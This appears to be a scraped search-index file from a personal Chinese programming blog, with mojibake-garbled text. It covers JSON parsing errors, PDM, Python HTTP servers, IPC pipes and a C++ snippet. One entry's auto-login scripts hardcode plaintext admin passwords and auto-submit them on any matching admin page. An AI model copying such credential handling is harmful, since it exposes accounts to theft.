&#x27;B00E1YRI4C&#x27;, &#x27;B00AFDOPDA&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00CEUWY8K&#x27;, &#x27;B003IEDM9Q&#x27;, &#x27;B00HSOJB9M&#x27;, &#x27;0000031895&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B008F0SMUC&#x27;, &#x27;B00362QGW0&#x27;, &#x27;B008UD01L2&#x27;, &#x27;B00FAZ5ZE6&#x27;, &#x27;B008F0SY6O&#x27;, &#x27;B00DPLLQR2&#x27;, &#x27;B00CEUWUZC&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B00CEUX0D8&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D10CLVW&#x27;, &#x27;B00D23MC6W&#x27;, &#x27;B007XAI53E&#x27;, &#x27;B008X6CBS2&#x27;, &#x27;B004PEI45U&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002C3Y6WG&#x27;, &#x27;B00HSC8O74&#x27;, &#x27;B008BMGHM4&#x27;, &#x27;B00CEUWTFS&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B00CYBU84G&#x27;, &#x27;B00D9C32NI&#x27;, &#x27;B0046W9T8C&#x27;, &#x27;B008UBG5IW&#x27;, &#x27;B001YHX45G&#x27;, &#x27;B00CEV8366&#x27;, &#x27;B00I2UHSZA&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B001GTKPEK&#x27;, &#x27;B004TU1VPU&#x27;, &#x27;B00CBPIO7S&#x27;, &#x27;B00CHHXJ0M&#x27;, &#x27;B00538F5OK&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B00CEUX4QQ&#x27;, &#x27;B003XRKA7A&#x27;, &#x27;0000031852&#x27;, &#x27;B002C3R5XI&#x27;, &#x27;B00C6Q1Z6E&#x27;], &#x27;bought_together&#x27;: [&#x27;B002BZX8Z6&#x27;]&#125;, &#x27;title&#x27;: &#x27;Girls Ballet Tutu Neon Pink&#x27;, &#x27;price&#x27;: 7.0, &#x27;salesRank&#x27;: &#123;&#x27;Toys &amp; Games&#x27;: 201847&#125;, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/41xBoP0FVzL._SY300_.jpg&#x27;, &#x27;brand&#x27;: &#x27;Unknown&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;]], &#x27;description&#x27;: &#x27;High quality 3 layer ballet tutu. 12 inches in length&#x27;&#125;[[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;]] æ‰“å°äº†jsonä¸­categorieså¯¹è±¡çš„å€¼ï¼š [[â€˜Sports &amp; Outdoorsâ€™, â€˜Other Sportsâ€™, â€˜Danceâ€™, â€˜Clothingâ€™, â€˜Girlsâ€™, â€˜Skirtsâ€™]], [[â€˜Sports &amp; Outdoorsâ€™, â€˜Other Sportsâ€™, â€˜Danceâ€™]], [[â€˜Sports &amp; Outdoorsâ€™, â€˜Other Sportsâ€™, â€˜Danceâ€™, â€˜Clothingâ€™, â€˜Girlsâ€™, â€˜Skirtsâ€™]] 2. å¸¸è§é”™è¯¯åŠè§£å†³åŠæ³• Expecting property name enclosed in double quotes: line 1 column 2 (char 1) Jsonæ–‡ä»¶çš„å•åŒå¼•å·ä¸å¯¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºPythonä¸­çš„ä¸€ä¸ªstrï¼ŒJsonä¸­çš„Keyå€¼éƒ½æ˜¯ç”¨å•å¼•å·'æ‹¬èµ·æ¥çš„ï¼Œå°±ä¼šæŠ¥é”™Expecting property name enclosed in double quotesï¼š 1&quot;&#123;&#x27;asin&#x27;: &#x27;0000032069&#x27;, &#x27;title&#x27;: &#x27;Adult Ballet Tutu Cheetah Pink&#x27;, &#x27;price&#x27;: 7.89, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/51EzU6quNML._SX342_.jpg&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;0000032034&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00EXVN9PU&#x27;, &#x27;B0041EOTJO&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B001GTKPDQ&#x27;, &#x27;B00EON0SJ2&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002XZMGGQ&#x27;], &#x27;also_viewed&#x27;: [&#x27;B00D0F450I&#x27;, &#x27;0000032050&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;0000032042&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B0071KR2LC&#x27;, &#x27;B00GOR07RE&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B0079MCIMU&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00H3RYN3I&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B007IEFT84&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B007R2RM8W&#x27;, &#x27;B007VM3AMK&#x27;, &#x27;B00C0PLENA&#x27;, &#x27;B00BJGG6VG&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00IIK61WA&#x27;, &#x27;B009UC638W&#x27;, &#x27;B00KZN6RVI&#x27;, &#x27;B00CSFEENY&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00HSOJJ94&#x27;, &#x27;B00LIPP4VG&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B00E87F196&#x27;, &#x27;B005HMHOQY&#x27;, &#x27;B00J6S9MSS&#x27;, &#x27;0000032034&#x27;, &#x27;B00CJQGNJK&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B0056LG7GY&#x27;, &#x27;B00DPQWCZ2&#x27;, &#x27;B00I3PV0US&#x27;, &#x27;B00KZN6IVW&#x27;, &#x27;B0054TBWKO&#x27;, &#x27;B00I2S01I8&#x27;, &#x27;B00BXF12P8&#x27;, &#x27;B00GVHU678&#x27;, &#x27;B005NWENGC&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B00JK8MQ4Q&#x27;, &#x27;B00FZIMVQS&#x27;, &#x27;B008BB19VE&#x27;, &#x27;B00GTEXPOE&#x27;, &#x27;B009WPT2RQ&#x27;, &#x27;B00E37SBBG&#x27;], &#x27;bought_together&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;]&#125;, &#x27;brand&#x27;: &#x27;BubuBibi&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]]&#125;&quot; æ›¿æ¢æ‰strä¸­çš„'ä¸º&quot;ï¼Œæ›¿æ¢/_ï¼ˆç©ºæ ¼ï¼‰ä¸º/: 1text.replace(&quot;&#x27;&quot;, &#x27;&quot;&#x27;).replace(&#x27;/ &#x27;, &#x27;/&#x27;) å†æ¥ç€è¯»å–å°±ä¸ä¼šæŠ¥é”™äº†ï¼ï¼ï¼ 1JsonValue[&#x27;categories&#x27;] ç»“æœï¼š 1[[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]] expecting , delimiter è¿™ä¸ªé—®é¢˜çœŸçš„è¢«æå¾—å¤´ç–¼ï¼Œåˆ°ç›®å‰è¿˜æ²¡è§£å†³ï¼ŒJsonå­—æ®µæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯loads()å‡½æ•°å°±æ˜¯ä¼šæŠ¥é”™ è§£å†³åŠæ³•","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"https://hodlyounger.github.io/categories/B-Code/Python/"}]},{"title":"python å¼€å¯httpæœåŠ¡","date":"2023-10-27T01:24:02.221Z","path":"B_Code/Python/pythonå¼€å¯httpæœåŠ¡/","text":"æ¦‚è¿°ï¼šä½¿ç”¨pythonå¼€å¯httpæœåŠ¡ [toc] python å¼€å¯ http æœåŠ¡ åœ¨éœ€è¦å¼€å¯httpæœåŠ¡çš„æ–‡ä»¶ä»¶è¿è¡Œä¸€ä¸‹å‘½ä»¤å³å¯ï¼š 123python -m SimpleHTTPServer 8080# æˆ–è€…python -m http.server 8080","tags":[{"name":"Code/python","slug":"Code-python","permalink":"https://hodlyounger.github.io/tags/Code-python/"},{"name":"http","slug":"http","permalink":"https://hodlyounger.github.io/tags/http/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"https://hodlyounger.github.io/categories/B-Code/Python/"}]},{"title":"ã€Pythonã€‘pdmç”¨æ³•æ•´ç†","date":"2023-10-27T01:24:02.220Z","path":"B_Code/Python/ã€Pythonã€‘pdmç”¨æ³•/","text":"æ¦‚è¿°ï¼šæ¥äº†ï¼åˆ’æ—¶ä»£çš„ Python åŒ…ç®¡ç†å·¥å…· â€“ PDM - çŸ¥ä¹ ä½¿ç”¨ PDM åˆå§‹åŒ– PDM 1pdm init æŸ¥çœ‹å¸®åŠ© 1pdm -h åˆ‡æ¢pythonç¯å¢ƒ å½“ä½ åœ¨åˆå§‹åŒ– pdm é¡¹ç›®æ—¶ï¼Œå°±å·²ç»é€‰å®šäº†å½“å‰çš„ Python ç‰ˆæœ¬å’Œå¯ç”¨çš„ Python ç‰ˆæœ¬èŒƒå›´ï¼Œåé¢å¦‚æœæƒ³æ›´æ”¹ï¼Œå¯ä»¥ä½¿ç”¨ use å‘½ä»¤ï¼Œä½†ç‰ˆæœ¬è¦å—ä¹‹å‰è®¾å®šçš„ç‰ˆæœ¬èŒƒå›´çº¦æŸã€‚ å‡è®¾å…è®¸èŒƒå›´æ˜¯ python 3.9+ï¼Œå½“å‰ä½¿ç”¨çš„æ˜¯ python 3.10ï¼Œå¯ä»¥ç›´æ¥åˆ‡æ¢è¿‡å»ã€‚ 1pdm use python3.9 è™šæ‹Ÿç¯å¢ƒ 1pdm venv ä½¿ç”¨ venv å¦‚æœæ²¡æœ‰pdmï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ venv åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ åˆ›å»ºç¯å¢ƒ 12# ENV_DIR æŒ‡å®šå­˜æ”¾ç¯å¢ƒçš„ç›®å½•ï¼Œä¸€èˆ¬ä½¿ç”¨ venvpython -m venv ENV_DIR æ¿€æ´»ç¯å¢ƒ windows 1.\\ENV_DIR\\Scripts\\activate Unix\\macOS 1source ENV_DIR\\bin\\activate é€€å‡ºç¯å¢ƒ 1deactivate","tags":[{"name":"Code/python","slug":"Code-python","permalink":"https://hodlyounger.github.io/tags/Code-python/"},{"name":"pdm","slug":"pdm","permalink":"https://hodlyounger.github.io/tags/pdm/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"https://hodlyounger.github.io/categories/B-Code/Python/"}]},{"title":"Python ç•Œé¢å®ç° Gui ç•Œé¢è‡ªåŠ¨è¾“å…¥","date":"2023-10-27T01:24:02.218Z","path":"B_Code/Python/guiç•Œé¢è‡ªåŠ¨è¾“å…¥/","text":"å¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨åå°æ—¶ï¼Œæ¯æ¬¡éƒ½éœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¾ˆéº»çƒ¦ï¼Œå°è¯•è§£å†³è¿™ä¸ªéº»çƒ¦çš„è¿‡ç¨‹ä¸­ä½¿ç”¨äº† pyautogui è¿™ä¸ªåº“ï¼Œæ•´ç†è®°å½•ä¸€ä¸‹ï¼Œå®é™…ç™»å½•webç½‘ç«™æ—¶ï¼Œè‡ªåŠ¨è¾“å…¥è¿˜æœ‰åˆ«çš„æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨æ²¹çŒ´è„šæœ¬å®ç°ï¼Œè¯¦è§æ–‡æœ«ä½¿ç”¨æ²¹çŒ´è‡ªåŠ¨ç™»å½•ç½‘ç«™ã€‚ [toc] ä½¿ç”¨ python å®ç° Gui è‡ªåŠ¨ç™»å½• éœ€æ±‚ ç•Œé¢ä¸»åŠ¨è¾“å…¥ admin åè·³è½¬åˆ°å¯†ç æ å†è‡ªåŠ¨è¾“å…¥ Admin@2022 æ€è·¯ ä¸»è¦æ˜¯ä½¿ç”¨ pyautogui åº“ï¼Œ pyautoguiå°è£…äº†ç•Œé¢çš„ç›¸å…³æ“ä½œï¼ŒåŒ…æ‹¬é¼ æ ‡å’Œé”®ç›˜äº‹ä»¶ã€‚ æºç  pyautogui.typewrite å¯ä»¥æ¨¡æ‹Ÿè¾“å…¥å­—ç¬¦çš„è¾“å…¥ pyautogui.press å¯ä»¥æ¨¡æ‹Ÿå…¶ä»–æ“ä½œç±»å‹çš„é”®çš„è¾“å…¥ åŸºäºä»¥ä¸Šä¸¤ç‚¹ï¼Œæˆ‘ä»¬åªéœ€è¦æ„å»ºä¸€ä¸ªè¾“å…¥çš„é˜Ÿåˆ—ï¼Œç„¶åéå†é˜Ÿåˆ—æ‰§è¡Œå“åº”çš„æ“ä½œå³å¯ æ„å»ºè¾“å…¥é˜Ÿåˆ— é˜Ÿåˆ—çš„é”®å€¼çš„é”®å€¼å¦‚ä¸‹æ‰€ç¤ºï¼Œå…ˆè¾“å…¥éœ€è¦å½•å…¥çš„å•è¯ï¼Œç´§æ¥ç€æ‰§è¡Œå¯¹åº”çš„æ“ä½œå³å¯ï¼š 1234567891011# &#123;pyautogui.typewriteï¼Œ pyautogui.press&#125;tac = &#123; &#x27;admin&#x27;:&#x27;tab&#x27;, &#x27;Admin@2022&#x27;:&#x27;enter&#x27;&#125;wiki = &#123; &#x27;admin&#x27;:&#x27;tab&#x27;, &#x27;Admin@2022&#x27;:&#x27;enter&#x27;&#125; éå†è¾“å…¥é˜Ÿåˆ— 1234for key in tac: print(key, &quot;:&quot;, tac[key]) pyautogui.typewrite(key, interval=interval) pyautogui.press(tac[key], interval=interval) å®Œæ•´ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445&quot;&quot;&quot;python -m PyInstaller -F -w -n auto_input ./auto_input.py&quot;&quot;&quot;import pathlibimport pyautogui# æ§åˆ¶é€Ÿåº¦interval = 0.05tac = &#123; &#x27;admin&#x27;:&#x27;tab&#x27;, &#x27;Admin@2022&#x27;:&#x27;enter&#x27;&#125;wiki = &#123; &#x27;admin&#x27;:&#x27;tab&#x27;, &#x27;Admin@2022&#x27;:&#x27;enter&#x27;&#125;text_alert = &quot;&quot;&quot;å¼€å§‹å‰è¯·ç¡®ä¿å®Œæˆä»¥ä¸‹æ“ä½œ 1. è¯·åˆ‡æ¢ä¸ºè‹±æ–‡è¾“å…¥æ³• 2. è¯·æ‰“å¼€è¾“å…¥ç•Œé¢ 3. å°†å…‰æ ‡æ”¾è‡³å¼€å§‹è¾“å…¥çš„ä½ç½® 4. é€‰æ‹©è¦è¾“å…¥çš„ä»£ç &quot;&quot;&quot;def main(): global codes option = pyautogui.confirm(text=text_alert, title=&#x27;è‡ªåŠ¨è¾“å…¥å°å·¥å…·&#x27;, buttons=[&#x27;tac&#x27;,&#x27;wiki&#x27;]) if option == &#x27;tac&#x27;: for key in tac: print(key, &quot;:&quot;, tac[key]) pyautogui.typewrite(key, interval=interval) pyautogui.press(tac[key], interval=interval) elif option == &#x27;wiki&#x27;: for key in tac: print(key, &quot;:&quot;, wiki[key]) pyautogui.typewrite(key, interval=interval) pyautogui.press(wiki[key], interval=interval)if __name__ == &#x27;__main__&#x27;: main() webç½‘ç«™ä½¿ç”¨æ²¹çŒ´è„šæœ¬å®ç°è‡ªåŠ¨ç™»å½• 123456789101112131415161718192021222324252627282930313233343536373839// ==UserScript==// @name é›¶ä¿¡ä»»TACä¸€é”®ç™»å½•// @namespace http://tampermonkey.net/// @version 0.1// @description try to take over the world!// @author BladeHiker// @match https://*/admin/*// @match https://*/tap/admin/*// @icon https://www.google.com/s2/favicons?sz=64&amp;domain=57.171// @grant none// ==/UserScript==(function() &#123; &#x27;use strict&#x27;; window.onload = () =&gt; &#123; setInterval(()=&gt;&#123; if(window.location.pathname==&#x27;/admin/login&#x27;)&#123; setTimeout(()=&gt;&#123; document.getElementsByName(&quot;username&quot;)[0].value = &#x27;admin&#x27;; document.getElementsByName(&quot;password&quot;)[0].value = &#x27;Admin@2022&#x27;; document.getElementsByName(&quot;username&quot;)[0].dispatchEvent(new InputEvent(&quot;input&quot;)) document.getElementsByName(&quot;password&quot;)[0].dispatchEvent(new InputEvent(&quot;input&quot;)) document.getElementsByTagName(&quot;button&quot;)[0].click() &#125;,200) &#125; else if(window.location.pathname==&#x27;/tap/admin/dist/login&#x27;)&#123; setTimeout(()=&gt;&#123; document.getElementsByName(&quot;username&quot;)[0].value = &#x27;admin&#x27;; document.getElementsByName(&quot;password&quot;)[0].value = &#x27;admin@1234&#x27;; document.getElementsByName(&quot;username&quot;)[0].dispatchEvent(new InputEvent(&quot;input&quot;)) document.getElementsByName(&quot;password&quot;)[0].dispatchEvent(new InputEvent(&quot;input&quot;)) document.getElementsByTagName(&quot;button&quot;)[0].click() &#125;,200) &#125;&#125;,1000) &#125; // Your code here...&#125;)();","tags":[{"name":"Code/Python","slug":"Code-Python","permalink":"https://hodlyounger.github.io/tags/Code-Python/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"https://hodlyounger.github.io/categories/B-Code/Python/"}]},{"title":"æ–‡ä»¶å¤§å°æ¢ç®—æ–¹æ³•","date":"2023-10-27T01:24:02.216Z","path":"B_Code/LeetCode/ConvertFileSize/","text":"æ–‡ä»¶å¤§å°è½¬æ¢æ–¹æ³• 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;using namespace std;string convertSize(double size)&#123; string strSize[6] = &#123; &quot;B&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot;, &quot;PB&quot; &#125;; unsigned int flag = 1024; for (int i = 0; i &lt; _countof(strSize); i++) &#123; if ((size / flag) &lt; 1) &#123; char strTemp[1024]; string strRet; sprintf_s(strTemp, &quot;%.2f&quot;, size); return strRet.append(strTemp).append(strSize[i]); &#125; else &#123; size = size / flag; &#125; &#125; return &quot;&quot;;&#125;int main()&#123; std::cout &lt;&lt; &quot;Hello World!\\n&quot;; double FlieSize_1 = 224945; double FlieSize_2 = 2249450; double FlieSize_3 = 2249450000; cout &lt;&lt; &quot;FlieSize_1ï¼š&quot; &lt;&lt; convertSize(FlieSize_1) &lt;&lt; endl; cout &lt;&lt; &quot;FlieSize_2ï¼š&quot; &lt;&lt; convertSize(FlieSize_2) &lt;&lt; endl; cout &lt;&lt; &quot;FlieSize_3ï¼š&quot; &lt;&lt; convertSize(FlieSize_3) &lt;&lt; endl; &#125;","tags":[{"name":"C++","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"},{"name":"Demo","slug":"Demo","permalink":"https://hodlyounger.github.io/tags/Demo/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"LeetCode","slug":"B-Code/LeetCode","permalink":"https://hodlyounger.github.io/categories/B-Code/LeetCode/"}]},{"title":"ã€ç®¡é“ã€‘ï¼ˆä¸€ï¼‰ åˆè¯†ç®¡é“","date":"2023-10-27T01:24:02.215Z","path":"B_Code/IPC/ã€ç®¡é“ã€‘åˆè¯†ç®¡é“/","text":"[toc] è‡ªå·±çš„ç†è§£ï¼Œ é¦–å…ˆè¦åŒºåˆ†æ¦‚å¿µï¼šç®¡é“å’Œç®¡é“é€šä¿¡ æ‰€è°“â€œç®¡é“â€ï¼Œæ˜¯æŒ‡ç”¨äºè¿æ¥ä¸€ä¸ªè¯»è¿›ç¨‹å’Œä¸€ä¸ªå†™è¿›ç¨‹ä»¥å®ç°å®ƒä»¬ä¹‹é—´é€šä¿¡çš„ä¸€ä¸ªå…±äº«æ–‡ä»¶ï¼Œåˆåpipeæ–‡ä»¶ ï¼ˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œè¿™å°±æ„å‘³ç€ä½ å¯ä»¥å‘æ“ä½œæ–‡ä»¶ä¸€æ ·æ“ä½œæ— åç®¡é“ï¼Œæ— åç®¡é“åœ¨å†…æ ¸ä¸­å¯¹åº”çš„æ˜¯ä¸€æ®µç‰¹æ®Šçš„å†…å­˜ç©ºé—´ï¼Œè¿™æ®µå†…å­˜ç©ºé—´ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œç®¡ç†ï¼Œå¯¹ç”¨æˆ·æ˜¯ä¸å¯è§çš„ï¼Œåœ¨ç”¨æˆ·ç©ºé—´çš„åº”ç”¨ç¨‹åºä¸­åªèƒ½é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥è®¿é—®å®ƒã€‚åœ¨è¿™æ®µå†…å­˜ç©ºé—´ä¸­ä»¥å¾ªç¯é˜Ÿåˆ—çš„æ–¹å¼æ¥ä¸´æ—¶å­˜å‚¨ä¸€ä¸ªè¿›ç¨‹å‘å¾€å¦å¤–ä¸€ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨é€šä¿¡å®Œæˆåå°±ä¼šè‡ªåŠ¨é‡Šæ”¾ç›¸åº”çš„ç©ºé—´ã€‚ï¼‰ è€Œç®¡é“é€šä¿¡æ˜¯æ¶ˆæ¯ä¼ é€’çš„ä¸€ç§ç‰¹æ®Šæ–¹å¼ã€‚ å³ç®¡é“æ˜¯æ–‡ä»¶ï¼Œæ˜¯æœåŠ¡äºç®¡é“é€šä¿¡çš„ç‰¹æ®Šæ–‡ä»¶ï¼Œè€Œç®¡é“é€šä¿¡æ˜¯ä¸€ç§é€šä¿¡æ–¹å¼ï¼Œè¿™ç§é€šä¿¡æ–¹å¼æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯åŠåŒå·¥çš„é€šä¿¡æ–¹å¼ï¼Œå³æ•°æ®åªèƒ½å•å‘æµåŠ¨ï¼Œæ•°æ®ä¼ é€’çš„æ–¹å¼æ˜¯å­—ç¬¦æµå½¢å¼ï¼Œå®ƒä¸€èˆ¬æ˜¯åº”ç”¨åœ¨å…·æœ‰å…±åŒç¥–å…ˆçš„è¿›ç¨‹é—´ä½¿ç”¨ã€‚ ç®¡é“é€šä¿¡æ˜¯ä»€ä¹ˆï¼Ÿ ç”¨äºè¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ä¸€ç§é€šä¿¡æ–¹å¼ã€‚ ç®¡é“é€šä¿¡æœ‰å“ªäº›ç‰¹ç‚¹ï¼Ÿ åŠåŒå·¥çš„é€šä¿¡æ–¹å¼ï¼Œæ•°æ®åªèƒ½å•å‘æµåŠ¨ï¼Œæ•°æ®ä¼ é€’çš„æ–¹å¼æ˜¯å­—ç¬¦æµå½¢å¼ã€‚ ç®¡é“é€šä¿¡çš„åº”ç”¨åœºåˆï¼Ÿ å…·æœ‰å…±åŒç¥–å…ˆçš„è¿›ç¨‹é—´ä½¿ç”¨ã€‚ 1ã€ä»€ä¹ˆæ˜¯ç®¡é“ ç®¡é“ï¼š â€”å°±åƒç°å®ä¸­çš„æ°´ç®¡ï¼Œæ°´å°±åƒæ•°æ®ã€‚ï¼ˆè¿æ¥è¿›ç¨‹ï¼Œç›¸å½“äºåœ¨è¿›ç¨‹é—´è¿æ¥ä¸€ä¸ªé€šè·¯ï¼Œç”¨æ¥ä¼ é€’ä¿¡æ¯ï¼‰ â€”ç®¡é“æ˜¯ä¸€ç§åŠåŒå·¥çš„é€šä¿¡æ–¹å¼ â€”æ•°æ®åªèƒ½å•å‘æµåŠ¨ï¼Œè€Œä¸”åªèƒ½åœ¨å…·æœ‰å…±åŒç¥–å…ˆçš„è¿›ç¨‹é—´ä½¿ç”¨ã€‚ æ‰€è°“åŠåŒå·¥çš„æ¨¡å¼ ï¼ˆå‡è®¾é€šä¿¡åŒæ–¹æ˜¯ç”²æ–¹å’Œä¹™æ–¹ï¼ŒåŒå·¥é€šä¿¡æ–¹å¼çš„æ„æ€æ˜¯ç”²å¯ä»¥å‘ä¹™å‘é€æ•°æ®ï¼Œä¹™ä¹Ÿå¯ä»¥å‘ç”²å‘é€æ•°æ®ï¼Œå³æ•°æ®æµé€šæ˜¯åŒå‘çš„ã€‚è€ŒåŠåŒå·¥çš„é€šä¿¡æ–¹å¼æ˜¯æŒ‡ç”²ä¹™ä¸¤æ–¹ä¸èƒ½åŒæ—¶å‘å¯¹æ–¹å‘é€æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ç”²å‘ä¹™å‘é€æ•°æ®æ—¶ï¼Œä¹™åªèƒ½æ¥æ”¶ä¸èƒ½å‘é€ï¼Œè€Œä¹™å‘ç”²å‘é€æ•°æ®æ—¶ï¼Œç”²åªèƒ½æ¥æ”¶ä¸èƒ½å‘ä¹™å‘é€æ•°æ®ï¼‰ ä¸¾ä¸ªä¾‹å­ï¼š å½¢è±¡æ¥è¯´ç±»ä¼¼ä¸€ä¸ªå•åˆ€åŒæ·å¼€å…³ï¼Œæœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä½†æ˜¯äºŒè€…æ˜¯äº’æ–¥çš„ï¼Œå½“é€‰æ‹©äº†ä¸€æ–¹å¦ä¸€æ–¹å°±å¤±æ•ˆã€‚ è€Œå¯¹äºæ­¤å¤„çš„ç®¡é“ï¼Œå¯ä»¥æŠŠå®ƒæƒ³æˆæ˜¯ç®¡é“çš„ä¸€ç«¯ï¼Œä¸€æ¬¡åªèƒ½è°ƒç”¨ä¸€ç§åŠŸèƒ½è¯»å…¥æˆ–è€…å†™å…¥ï¼ŒäºŒè€…ä¹Ÿæ˜¯äº’æ–¥çš„ã€‚ ç®¡é“é€šä¿¡æ˜¯æ¶ˆæ¯ä¼ é€’çš„ä¸€ç§ç‰¹æ®Šæ–¹å¼ï¼Œç®¡é“æœºåˆ¶å¿…é¡»æä¾›ä»¥ä¸‹ä¸‰æ–¹é¢çš„åè°ƒèƒ½åŠ›ï¼šäº’æ–¥ã€åŒæ­¥å’Œç¡®å®šå¯¹æ–¹çš„å­˜åœ¨ã€‚ 2ã€ä¸ºä»€ä¹ˆè¦æœ‰ç®¡é“ åœ¨ä¸€ä¸ªå¤šè¿›ç¨‹æ“ä½œç³»ç»Ÿæ‰€æä¾›çš„è¿è¡Œç¯å¢ƒä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¸¤ç§ä¸åŒçš„é€”å¾„æˆ–è€…è¯´é‡‡ç”¨ä¸¤ç§ä¸åŒçš„ç­–ç•¥ï¼Œæ¥å»ºç«‹èµ·å¤æ‚çš„å¤§å‹åº”ç”¨ç³»ç»Ÿã€‚ä¸€ç§é€”å¾„å°±æ˜¯é€šè¿‡ä¸€ä¸ªå­¤ç«‹çš„,å¤§å‹çš„ï¼Œå¤æ‚çš„è¿›ç¨‹æä¾›æ‰€éœ€çš„å…¨éƒ¨æœåŠ¡ï¼Œå¦å¤–ä¸€ç§é€”å¾„å°±æ˜¯é€šè¿‡ç”±è‹¥å¹²ç›¸äº’è”ç³»çš„ï¼Œå°å‹çš„ã€‚ç›¸å¯¹ç®€å•çš„è¿›ç¨‹æ„æˆçš„ç»„åˆæ¥æä¾›æ‰€éœ€çš„åŠŸèƒ½ã€‚æ—©æœŸçš„æ“ä½œç³»ç»Ÿå¾€å¾€å€¾å‘ä¸å‰è€…ï¼Œè€ŒUnixä»¥åŠå…¶è¡ç”Ÿçš„å„ç§æ“ä½œç³»ç»Ÿå¾€å¾€å€¾å‘äºåè€…ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œåè€…æœ‰ç€å„ç§å¥½å¤„ï¼š1.æ¨¡å—åŒ–ï¼Œ2.å„ä¸ªè¿›ç¨‹éƒ½å¾—åˆ°ä¿æŠ¤ï¼Œåœ¨ç›¸å½“ç¨‹åº¦ä¸Šæ’é™¤äº†ç›¸äº’å¹²æ‰°çš„å¯èƒ½æ€§ï¼Œ3.çµæ´»æ€§æ›´å¼ºã€‚ 